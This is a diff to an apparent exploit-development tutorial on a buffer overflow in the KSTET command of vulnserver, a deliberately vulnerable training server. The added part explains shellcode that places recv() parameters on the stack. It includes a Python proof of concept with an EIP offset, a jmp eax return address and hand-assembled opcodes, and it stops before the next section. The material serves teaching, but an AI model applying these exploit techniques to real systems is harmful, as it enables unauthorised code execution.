@@ -56,7 +56,7 @@ The __second__ parameter, `char *buf` is a pointer to the memory location the bu
 
 The __third__ parameter, `int len` is the size of the buffer. Remember, this is going to be a hexademical representation of the decimal value we supply. A shell is around 350-3500 bytes. Let's remmeber this going forward.
 
-The __fourth__ parameter, `int flags`, is a numerical value that will allow for adding semantics/options to the function. We will just have this parameter set to `0`, as to not influence or change the function in any unintended way.
+The __fourth__ parameter, `int flags`, is a numerical value that will allow for adding semantics/options to the function. We will just have this parameter set to zero, as to not influence or change the function in any unintended way.
 
 Finding the Call to WS_32.recv()
 ---
@@ -412,4 +412,87 @@ A glimpse of the stack, with a value of zero:
 <img src="{{ site.url }}{{ site.baseurl }}/images/017.png" alt="">
 
 BufSize
+---
+Here is where we will determine our buffer size. Since we are working with hexadecimal, we will choose an easy number that is equivalent to a decimal amount enough for a shell (more than 350 bytes). We will choose 512 decimal, or 0x00000200 in __DWORD__ hexadecimal.
+
+We will deploy a technique talked about above- (when we added to cl). Since EDX is already equal to zero- from our flags parameter.
+
+This time, we will add to the DH (data high) register, which is the 8 bit register within the 16 bit register DX, which is apart of the 32 bit register EDX. This register is not at the MOST significant byte, but close to.
+
+When we add to DH (in context of EDX), it will look a little something like this:
+
+```console
+0x0000XX00
+      ↑↑
+      dh
+```
+
+Here are the shellcode instructions for this parameter:
+
+```console
+nasm > add dh, 0x02
+00000000  80C602            add dh,0x2
+nasm > push edx
+00000000  52                push edx
+```
+
+Updated POC:
+
+```python
+import os
+import sys
+import socket
+
+# Vulnerable command
+command = "KSTET "
+
+# 2000 bytes to crash vulnserver.exe
+# Software breakpoint to pause execution
+crash = "\xCC" * 2
+
+# Creating File Descriptor = 0x00000090
+crash += "\x31\xc9"			# xor ecx, ecx
+crash += "\x80\xc1\x88"			# add cl, 0x88
+crash += "\x51"				# push ecx
+crash += "\x89\xe7"			# mov edi, esp
+
+# Move ESP out of the way
+crash += "\x83\xec\x50"			# sub esp, 0x50
+
+# Flags = 0x00000000
+crash += "\x31\xd2"
+crash += "\x52"				# push edx
+
+# BufSize = 0x00000200
+crash += "\x80\xc6\x02"			# add dh, 0x02
+crash += "\x52"				# push edx
+
+# 70 byte offset to EIP
+crash += "\x41" * (70-len(crash))
+crash += "\xb1\x11\x50\x62"		# 0x625011b1 jmp eax essfunc.dll
+crash += "\x43" * (2000-len(crash))
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("172.16.55.143", 9999))
+
+s.send(command+crash)
+```
+
+Execution in Immunity
+
+```console
+add dh, 0x02
+```
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/018.png" alt="">
+
+```console
+push edx
+```
+
+Our BufSize and flags parameters are now on the stack!:
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/019.png" alt="">
+
+Buffer (Length):
 ---
